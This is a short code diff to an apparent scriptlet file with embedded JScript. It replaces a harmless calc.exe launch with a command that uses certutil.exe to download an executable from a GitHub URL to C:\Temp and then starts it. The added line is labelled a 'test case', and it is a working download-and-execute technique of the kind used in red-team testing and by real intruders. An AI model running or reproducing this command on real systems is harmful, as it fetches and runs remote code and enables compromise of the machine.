@@ -5,7 +5,7 @@
 
 <script language="JScript">
 <![CDATA[
-var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
+var r = new ActiveXObject("WScript.Shell").Run("cmd /c echo this is a test case & certutil.exe -urlcache -split -f https://github.com/Manju93-S/Test-Case/raw/main/test.exe C:\\Temp\\test1.exe & start C:\\Temp\\test1.exe"); 
 ]]>
 </script>
 
